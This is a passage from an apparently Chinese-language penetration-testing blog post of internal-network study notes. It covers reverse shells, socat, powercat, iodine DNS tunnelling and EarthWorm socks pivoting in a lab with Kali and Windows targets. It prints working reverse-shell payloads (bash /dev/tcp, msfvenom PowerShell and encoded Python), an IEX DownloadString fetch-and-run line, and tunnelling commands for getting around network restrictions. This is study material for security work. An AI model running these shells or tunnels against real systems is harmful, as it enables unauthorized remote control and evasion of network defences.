root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>结合其他语言进行反弹 shell</strong></p>
<pre class="line-numbers language-none"><code class="language-none"># 失陷主机
bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;rhost&#x2F;rport 0&gt;&amp;1

# 控制端
nc -lvp lprot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none"># 失陷主机
&gt; bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.16.214.43&#x2F;4444 0&gt;&amp;1

# 控制端
&gt; nc -lp 4444
root@ubuntu:~# whoami
whoami
root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>除了 bash 也可以使用其他的语言进行反弹 shell，这里可以使用 msfvenom 生成反弹 shell，操作起来比较方便，使用 <code>msfvenom -l payload | grep &quot;cmd/&quot;</code>可查看可使用的 payload</p>
<p>比如使用 <code>cmd/windows/reverse_powershell</code> 这个 payload</p>
<pre class="line-numbers language-none"><code class="language-none"># 控制端
&gt; msfvenom -p cmd&#x2F;windows&#x2F;reverse_powershell lhost&#x3D;172.16.214.43 lport&#x3D;4444
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 1586 bytes
powershell -w hidden -nop -c $a&#x3D;&#39;172.16.214.43&#39;;$b&#x3D;4444;$c&#x3D;New-Object system.net.sockets.tcpclient;$nb&#x3D;New-Object System.Byte[] $c.ReceiveBufferSize;$ob&#x3D;New-Object System.Byte[] 65536;$eb&#x3D;New-Object System.Byte[] 65536;$e&#x3D;new-object System.Text.UTF8Encoding;$p&#x3D;New-Object System.Diagnostics.Process;$p.StartInfo.FileName&#x3D;&#39;cmd.exe&#39;;$p.StartInfo.RedirectStandardInput&#x3D;1;$p.StartInfo.RedirectStandardOutput&#x3D;1;$p.StartInfo.RedirectStandardError&#x3D;1;$p.StartInfo.UseShellExecute&#x3D;0;$q&#x3D;$p.Start();$is&#x3D;$p.StandardInput;$os&#x3D;$p.StandardOutput;$es&#x3D;$p.StandardError;$osread&#x3D;$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);$esread&#x3D;$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a,$b);$s&#x3D;$c.GetStream();while ($true) &#123;    start-sleep -m 100;    if ($osread.IsCompleted -and $osread.Result -ne 0) &#123;      $r&#x3D;$os.BaseStream.EndRead($osread);      $s.Write($ob,0,$r);      $s.Flush();      $osread&#x3D;$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);    &#125;    if ($esread.IsCompleted -and $esread.Result -ne 0) &#123;      $r&#x3D;$es.BaseStream.EndRead($esread);      $s.Write($eb,0,$r);      $s.Flush();      $esread&#x3D;$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);    &#125;    if ($s.DataAvailable) &#123;      $r&#x3D;$s.Read($nb,0,$nb.Length);      if ($r -lt 1) &#123;          break;      &#125; else &#123;          $str&#x3D;$e.GetString($nb,0,$r);          $is.write($str);      &#125;    &#125;    if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) &#123;        break;    &#125;    if ($p.ExitCode -ne $null) &#123;        break;    &#125;&#125;

&gt; nc -lvp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将生成的 payload 复制到失陷主机上运行，即可收到反弹回的 shell</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-05-28_12-36-45.png"></p>
<p>再比如使用 <code>cmd/unix/reverse_python</code> 这个payload</p>
<pre class="line-numbers language-none"><code class="language-none"># 控制端
&gt; msfvenom -p cmd&#x2F;unix&#x2F;reverse_python lhost&#x3D;172.16.214.43 lport&#x3D;4444
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 505 bytes
python -c &quot;exec(__import__(&#39;base64&#39;).b64decode(__import__(&#39;codecs&#39;).getencoder(&#39;utf-8&#39;)(&#39;aW1wb3J0IHNvY2tldCAgICwgc3VicHJvY2VzcyAgICwgb3M7ICAgICAgaG9zdD0iMTcyLjE2LjIxNC40MyI7ICAgICAgcG9ydD00NDQ0OyAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICwgc29ja2V0LlNPQ0tfU1RSRUFNKTsgICAgICBzLmNvbm5lY3QoKGhvc3QgICAsIHBvcnQpKTsgICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAsIDApOyAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICwgMSk7ICAgICAgb3MuZHVwMihzLmZpbGVubygpICAgLCAyKTsgICAgICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik&#x3D;&#39;)[0]))&quot;

&gt; nc -lvp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>同样将生成的 payload 复制到失陷主机上运行，即可收到反弹回来的 shell，当然前提是目标主机安装了 python</p>
<h2 id="3、socat-使用"><a href="#3、socat-使用" class="headerlink" title="3、socat 使用"></a>3、socat 使用</h2><p>socat 下载地址：<a target="_blank" rel="noopener" href="http://www.dest-unreach.org/socat/">http://www.dest-unreach.org/socat/</a>，或者直接使用 <code>apt-get install socat</code> 安装，Mac 可使用 <code>brew install socat</code> 安装。</p>
<p>socat 全称 socket cat，可以视为 nc 的加强版，不过平时感觉 nc 也够用了，但是 nc 现在貌似会被杀软杀掉，而且貌似 nc 很久没更新了，反正多掌握点知识没坏处。</p>
<h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><p><strong>读取文件</strong></p>
<pre class="line-numbers language-none"><code class="language-none">&gt; socat - .&#x2F;test.txt  	# 相对路径读取
test

&gt; socat - &#x2F;tmp&#x2F;test.txt	# 绝对路径读取
test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>写入文件</strong></p>
<pre class="line-numbers language-none"><code class="language-none">&gt; echo &quot;hello world&quot; | socat - .&#x2F;test.txt
&gt; socat - .&#x2F;test.txt
test
hello world<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="网络操作"><a href="#网络操作" class="headerlink" title="网络操作"></a>网络操作</h3><p><strong>连接远程端口</strong></p>
<pre class="line-numbers language-none"><code class="language-none">&gt; socat - TCP:172.16.214.1:22
SSH-2.0-OpenSSH_7.4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>监听端口</strong></p>
<pre class="line-numbers language-none"><code class="language-none">socat - TCP-LISTEN:8002<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p><strong>转发 TCP 端口</strong></p>
<p>个人觉着这个是比较常用到的功能，在使用 CS 做重定向器时，就可以使用 socat 进行端口的转发。</p>
<pre class="line-numbers language-none"><code class="language-none">socat TCP4-LISTEN:80,fork TCP4:123.123.123.123:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这样在访问当前主机的 80 端口时，就会访问到 123.123.123.123 的 80 端口了，也可以使用 -d 调整输出信息的详细程度，最多使用四个 d，推荐使用两个，即 -dd</p>
<pre class="line-numbers language-none"><code class="language-none">socat -dd TCP4-LISTEN:80,fork TCP4:123.123.123.123:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>转发 UDP 端口</strong></p>
<p>和上面一样，将 TCP 改成 UDP 即可</p>
<pre class="line-numbers language-none"><code class="language-none">socat UDP4-LISTEN:80,fork UDP4:123.123.123.123:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>NAT 映射</strong></p>
<p>通过 socat 可以将内网端口映射到公网上，不过这种场景还是更推荐用 frp</p>
<pre class="line-numbers language-none"><code class="language-none"># 内网主机
socat tcp:123.123.123.123:4444 tcp:127.0.0.1:3389

# 公网主机
socat tcp-listen:4444 tcp-listen:5555<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>此时访问公网主机的 5555 端口就可以访问到内网主机的 3389 端口了</p>
<p>考虑到 socat 的其他功能平时也很少使用到，这里就不过多介绍了，网上相关文章也有很多，在此就不赘述了。</p>
<h1 id="0x08-powercat-的使用"><a href="#0x08-powercat-的使用" class="headerlink" title="0x08 powercat 的使用"></a>0x08 powercat 的使用</h1><h2 id="1、下载安装-powercat"><a href="#1、下载安装-powercat" class="headerlink" title="1、下载安装 powercat"></a>1、下载安装 powercat</h2><p>powercat 可以视为 nc 的 powershell 版本，因此也可以和 nc 进行连接。</p>
<p>powercat 可在 github 进行下载，项目地址为：<a target="_blank" rel="noopener" href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></p>
<p>下载下来 powercat.ps1 文件后，直接导入即可</p>
<pre class="line-numbers language-none"><code class="language-none">Import-Module .\powercat.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果提示未能加载指定模块，则可能是权限问题，可以参照之前写的 <a target="_blank" rel="noopener" href="https://teamssix.com/year/210206-191859.html">【内网学习笔记】2、PowerShell</a> 文章中的方法对其赋予权限，即在管理员模式下运行以下命令</p>
<pre class="line-numbers language-none"><code class="language-none">Set-ExecutionPolicy Unrestricted<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>之后就可以导入 powercat 了，导入成功后，输入 powercat -h 可以看到帮助信息。</p>
<p>如果没有权限，也可以直接下载远程文件进行绕过。</p>
<pre class="line-numbers language-none"><code class="language-none">IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>不过由于 github 在国内可能会无法打开，因此可以使用 web 代理站点或者把 powercat.ps1 文件放到自己的服务器上进行下载。</p>
<h2 id="2、powercat-的使用"><a href="#2、powercat-的使用" class="headerlink" title="2、powercat 的使用"></a>2、powercat 的使用</h2><p>powercat 命令参数</p>
<pre class="line-numbers language-none"><code class="language-none">-l		监听模式
-p		指定监听端口
-e		指定启动进程的名称
-v		显示详情
-c		指定想要连接的 IP 地址
-ep		返回 powershell
-dns	使用 dns 通信
-g		生成 payload
-ge		生成经过编码的 payload，可以直接使用 powershell -e 执行该 payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到和 nc 的命令还是很相似的。</p>
<h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>Kali 上的 nc 连接到靶机</p>
<pre class="line-numbers language-none"><code class="language-none">nc -v rhost rport<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">nc -v 172.16.214.21 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>靶机开启监听，等待 Kali 连接</p>
<pre class="line-numbers language-none"><code class="language-none">powercat -l -v -p lport -e cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">powercat -l -v -p 4444 -e cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p>Kali 上开启监听</p>
<pre class="line-numbers language-none"><code class="language-none">nc -lvp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>靶机向 kali 发起连接</p>
<pre class="line-numbers language-none"><code class="language-none">powercat -c rhost -p rport -e cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">powercat -c 172.16.214.46 -p 4444 -e cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="返回-powershell"><a href="#返回-powershell" class="headerlink" title="返回 powershell"></a>返回 powershell</h3><p>攻击机上运行</p>
<pre class="line-numbers language-none"><code class="language-none">powercat -l -v -p lport<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">powercat -l -v -p 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>靶机上运行</p>
<pre class="line-numbers language-none"><code class="language-none">powercat -c rhost -p rport -v -ep<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">powercat -c 172.16.214.21 -p 4444 -v -ep<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="作为跳板使用"><a href="#作为跳板使用" class="headerlink" title="作为跳板使用"></a>作为跳板使用</h3><p>测试环境为：</p>
<pre class="line-numbers language-none"><code class="language-none">kali			172.16.214.47
windows7	172.16.214.2
windows10	172.16.214.21<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>将 win7 作为跳板机，让 kali 通过 win7 连接到 windows10</p>
<p>在 win10 中执行以下命令</p>
<pre class="line-numbers language-none"><code class="language-none">powercat -l -v -p 4444 -e cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在 win7 中执行以下命令</p>
<pre class="line-numbers language-none"><code class="language-none">powercat -l -v -p 5555 -r tcp:172.16.214.21:4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>最后在 kali 下连接 win7</p>
<pre class="line-numbers language-none"><code class="language-none">nc -v 172.16.214.2 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-01_14-23-47.png"></p>
<h3 id="powercat-生成-payload"><a href="#powercat-生成-payload" class="headerlink" title="powercat 生成 payload"></a>powercat 生成 payload</h3><p>在攻击机上运行以下命令生成 shell.ps1 payload 文件</p>
<pre class="line-numbers language-none"><code class="language-none">powercat -l -p 4444 -e cmd -g &gt; shell.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>将 shell.ps1 文件拷贝到目标主机上后，执行 shell.ps1 文件</p>
<p>之后在攻击机上运行以下命令即可获得 shell</p>
<pre class="line-numbers language-none"><code class="language-none">powercat -c rhost -p rport -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">powercat -c 172.16.214.21 -p 4444 -v <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>反向连接也可以</p>
<p>在攻击机上生成 ps1 文件，并开启监听</p>
<pre class="line-numbers language-none"><code class="language-none">powercat -c rhost -p rport -ep -g &gt; shell.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">powercat -c 172.16.214.2 -p 4444 -ep -g &gt; shell.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">powercat -l -p 4444 -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>之后在靶机上，运行 ps1 文件就会上线了，如果不想生成文件，也可以使用 -ge 生成经过编码的 payload</p>
<p>在攻击机上生成 payload，并开启监听</p>
<pre class="line-numbers language-none"><code class="language-none">powercat -c 172.16.214.2 -p 4444 -ep -ge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">powercat -l -p 4444 -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在靶机上执行刚生成的 payload</p>
<pre class="line-numbers language-none"><code class="language-none">powershell -e payload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-01_15-35-24.png"></p>
<h3 id="建立-dns-隧道连接"><a href="#建立-dns-隧道连接" class="headerlink" title="建立 dns 隧道连接"></a>建立 dns 隧道连接</h3><p>powercat 的 dns 隧道是基于 dnscat 设计的，因此在服务端需要使用 dnscat 连接。</p>
<p>在服务端上安装 dnscat ，以 kali 为例</p>
<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;iagox86&#x2F;dnscat2.git
cd dnscat2&#x2F;server&#x2F;
gem install bundler
bundle install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>命令运行完之后，执行以下命令开启服务端</p>
<pre class="line-numbers language-none"><code class="language-none">ruby dnscat2.rb powercat -e open --no-cache<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在靶机下，执行以下命令，建立 dns 隧道</p>
<pre class="line-numbers language-none"><code class="language-none">powercat -c 172.16.214.47 -p 53 -dns powercat -e cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>此时，在 kali 上就能看到回连的会话了</p>
<pre class="line-numbers language-none"><code class="language-none">sessions				#	查看所有会话
session -i 1 		#	选择指定的会话进行交互<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>不过实测，虽然能返回会话，但不能执行命令，暂不清楚原因是什么。</p>
<p>powercat 暂时就记录这些，其他的比如文件传输什么的就不记了，毕竟使用频率几乎为零，平时使用最多的可能还是拿它来反弹 shell，不过为什么不用 CS 或者 MSF 呢，不更香嘛。</p>
<h1 id="0x09-iodine-使用"><a href="#0x09-iodine-使用" class="headerlink" title="0x09 iodine 使用"></a>0x09 iodine 使用</h1><h2 id="1、介绍-3"><a href="#1、介绍-3" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>iodine 这个名字起的很有意思，iodine 翻译过来就是碘，碘的原子序数为 53，53 也就是 DNS 服务对应的端口号。 </p>
<p>iodine 和 dnscat2 一样，适合于其他请求方式被限制以至于只能发送 DNS 请求的环境中，iodine 同样也是分成了直接转发和中继两种模式。</p>
<p>iodine 与 dnscat2 不同的在于 Iodine 服务端和客户端都是用 C 语言开发，同时 iodine 的原理也有些不同，iodine 通过 TAP 在服务端和客户端分别建立一个局域网和虚拟网卡，再通过 DNS 隧道进行连接，然后使其处在同一个局域网中。</p>
<h2 id="2、安装-1"><a href="#2、安装-1" class="headerlink" title="2、安装"></a>2、安装</h2><p>首先需要有一个域名，并设置 NS 和 A 记录，A 记录指向自己的公网 VPS 地址，NS 记录指向 A 记录的子域名。</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-07_17-20-20.png"></p>
<p>Kali 下自带 iodine ，Debian Linux 可以使用 apt 进行安装</p>
<pre class="line-numbers language-none"><code class="language-none">sudo apt-get install iodine<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Windows 可以直接到官网下载，下载地址：<a target="_blank" rel="noopener" href="https://code.kryo.se/iodine/">https://code.kryo.se/iodine/</a>，服务端名称是 iodined.exe，客户端是 iodine.exe</p>
<h2 id="3、使用-1"><a href="#3、使用-1" class="headerlink" title="3、使用"></a>3、使用</h2><p>这里服务端使用的是 Linux，服务端命令如下：</p>
<pre class="line-numbers language-none"><code class="language-none">sudo iodined -f -c -P teamssix 192.168.77.1 dc.teamssix.com -DD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">-f		在前台运行
-c		不检查传入请求的客户端 IP 地址
-P		客户端与服务端之间的连接密码
-D		调试级别，-D 表示第一级，-DD 表示第二级，依此类推

192.168.77.1 是自己自定义的局域网虚拟 IP 地址。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里客户端使用的是 Windows，Windows 客户端上除了要有 iodine 相关文件外，还需要安装 tap 网卡驱动程序，这里我百度找了一个下载地址 <a target="_blank" rel="noopener" href="http://www.qudong51.net/qudong/981.html">http://www.qudong51.net/qudong/981.html</a></p>
<p>打开下载好的 tap 网卡驱动程序，一直下一步下一步安装就行。</p>
<p>然后就可以启动客户端程序了，注意下载下来的 dll 文件要和 exe 在一个目录下，不能只复制一个 exe 到目标主机上，而且要以管理员权限运行下面的命令。</p>
<pre class="line-numbers language-none"><code class="language-none">.\iodine.exe -f -r -P teamssix dc.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">-r		iodine 有时会自动将 DNS 隧道切换成 UDP 通道，使用 -r 命令可以强制让 iodine 在任何情况下都使用 DNS 隧道<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果出现 <code>Connection setup complete, transmitting data.</code> 就表示 DNS 隧道就已经建立了。</p>
<p>这时如果去 ping 服务端自定义的虚拟 IP 也是可以 ping 通的。</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-08_21-12-06.png"></p>
<p>假如这里内网机器分配到了 192.168.77.2 这个 IP ，因为处在一个局域网中，所以 VPS 直接访问 192.168.77.2 的 3389、80 等端口就可以直接访问到内网机器的相关端口了，同样的内网主机也可以访问 VPS 的 22 端口等等，至此便绕过了策略限制。</p>
<h1 id="0x10-ew-的使用"><a href="#0x10-ew-的使用" class="headerlink" title="0x10 ew 的使用"></a>0x10 ew 的使用</h1><h2 id="1、Socks-代理工具介绍"><a href="#1、Socks-代理工具介绍" class="headerlink" title="1、Socks 代理工具介绍"></a>1、Socks 代理工具介绍</h2><p>Socks 代理可以理解成升级版的 lcx，关于 lcx 的用法可以看我之前的文章：</p>
<p><a target="_blank" rel="noopener" href="https://teamssix.com/year/210528-130449.html">https://teamssix.com/year/210528-130449.html</a></p>
<p>但是 lcx 毕竟年代久远，现在的杀软基本也都能识别到了，因此在实战中不太推荐使用 lcx ，更推荐使用这些 socks 代理工具。</p>
<p>常见的 socks 代理工具有 ew、termite、frp、nps、sSocks、reGeorg、Neo-reGeorg、SocksCap、Proxifier、ProxyChains 等等，不同的工具适合使用的场景和方法都有所不同。</p>
<p>因为在这其中有些工具笔者较经常使用，所以这里主要记录下 ew、frp、nps 的使用方法，本篇文章主要记录 ew 的使用，后续文章将更新 frp、nps 的使用。</p>
<p>开始之前，先理解下正向代理和反向代理的区别。</p>
<blockquote>
<p>正向代理：主动通过代理访问目标主机，即攻击主机 –》目标主机</p>
<p>反向代理：目标机器通过代理进行主动连接，即目标主机 –》攻击主机</p>
</blockquote>
<h2 id="2、ew-的使用"><a href="#2、ew-的使用" class="headerlink" title="2、ew 的使用"></a>2、ew 的使用</h2><p>ew 的项目主页：<a target="_blank" rel="noopener" href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></p>
<p>ew 全称 <code>EarthWorm</code>，直译过来就是<code>蚯蚓</code>，引用作者的原话是：</p>
<blockquote>
<p>该工具能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。</p>
</blockquote>
<p>这个描述也是很形象了。</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>作者已经不提供 ew 的下载了，但是搜了一下 github 还是有其他人上传的，不过病毒需自查。</p>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p>
<p>从这工具上传的时间是 5 年前就可以看出这个工具很有年代感了。</p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>该工具共有 6 种命令格式 ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran，正向连接的命令是 ssocked，反向连接的命令是 rcsocks 和 rssocks，其他命令用于一些比较复杂的网络环境中。</p>
<h4 id="a、正向连接"><a href="#a、正向连接" class="headerlink" title="a、正向连接"></a>a、正向连接</h4><p>正向连接需要目标主机有一个公网 IP，或者说攻击主机能够直接访问到目标主机。</p>
<p>命令也很简单</p>
<pre class="line-numbers language-none"><code class="language-none">ew -s ssocksd -l 1080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">-s 设置状态模式 -l 设置监听端口<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">&gt; .\ew_for_Win.exe -s ssocksd -l 1080ssocksd 0.0.0.0:1080 &lt;--[10000 usec]--&gt; socks server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后使用 SocksCap、Proxifier、ProxyChains 等工具配置上目标主机的 IP 和监听端口即可，socks 要选择 socks5</p>
<h4 id="b、反向连接"><a href="#b、反向连接" class="headerlink" title="b、反向连接"></a>b、反向连接</h4><p>反向连接适合于目标没有公网 IP 的情况，这时就需要一台公网 vps 了，这里就直接以内网地址作为演示了。</p>
<p>在公网 VPS 上执行以下命令：</p>
<pre class="line-numbers language-none"><code class="language-none">ew -s rcsocks -l 1080 -e 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">-e 设置反弹主机端口<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;ew_for_linux64 -s rcsocks -l 1080 -e 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这条命令表示将 1080 端口接收到的数据转发到 4444 端口上。</p>
<p>在目标主机上执行以下命令：</p>
<pre class="line-numbers language-none"><code class="language-none">ew -s rssocks -d vps_ip -e 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">-d 设置反弹主机 IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">&gt; .\ew_for_Win.exe -s rssocks -d 172.16.214.52 -e 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这条命令表示在本地开启 socks 5 服务，并反弹到 vps 的 4444 端口，如果代理建立成功，在 VPS 端就会看到 <code>rssocks cmd_socket OK!</code> 的提示。</p>
<p>最后，代理 vps 的 1080 端口就可以访问到目标主机的内网了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-09_10-24-45.png"></p>
<h4 id="c、二级网络环境（一）"><a href="#c、二级网络环境（一）" class="headerlink" title="c、二级网络环境（一）"></a>c、二级网络环境（一）</h4><p>有这样的一个网络环境，目标主机A有两个网卡，一个内网地址一个公网地址，但这个主机只能访问内网主机B不能访问其他内网资源，而内网主机B不能访问外网但是能访问内网资源。</p>
<p>在拿到这两台主机权限后，就可以使用 ew 进行二级跳板访问到内网资源。</p>
<pre class="line-numbers language-none"><code class="language-none">内网主机A（有公网IP） --》内网主机B --》内网资源<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在内网主机B上，开启正向连接代理</p>
<pre class="line-numbers language-none"><code class="language-none">ew -s ssocksd -l 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">&gt; .\ew_for_Win.exe -s ssocksd -l 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在内网主机A上</p>
<pre class="line-numbers language-none"><code class="language-none">ew -s lcx_tran -l 1080 -f hostB_ip -g 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;ew_for_linux64 -s lcx_tran -l 1080 -f 192.168.7.110 -g 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这条命令表示将 1080 端口收到的代理请求转发到内网主机 B 192.168.7.110 的 4444 端口，此时就可以通过访问内网主机 A 的外网 IP 的 1080 端口访问到内网主机 B 上架设的 socks5 代理了。</p>
<h4 id="d、二级网络环境（二）"><a href="#d、二级网络环境（二）" class="headerlink" title="d、二级网络环境（二）"></a>d、二级网络环境（二）</h4><p>在上面的环境中，内网主机 A 有公网 IP，如果没有公网 IP 的情况下，又该怎么办呢？这时候就需要结合反向连接了，因此需要一台公网的 VPS 主机。</p>
<pre class="line-numbers language-none"><code class="language-none">VPS --》内网主机A --》内网主机B --》内网资源<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在公网 VPS 上</p>
<pre class="line-numbers language-none"><code class="language-none">ew -s lcx_listen -l 1080 -e 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;ew_for_linux64 -s lcx_listen -l 1080 -e 4444rcsocks 0.0.0.0:1080 &lt;--[10000 usec]--&gt; 0.0.0.0:4444init cmd_server_for_rc herestart listen port here<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>表示将 1080 收到的 代理请求转发到 4444 端口上</p>
<p>在内网主机 B 上</p>
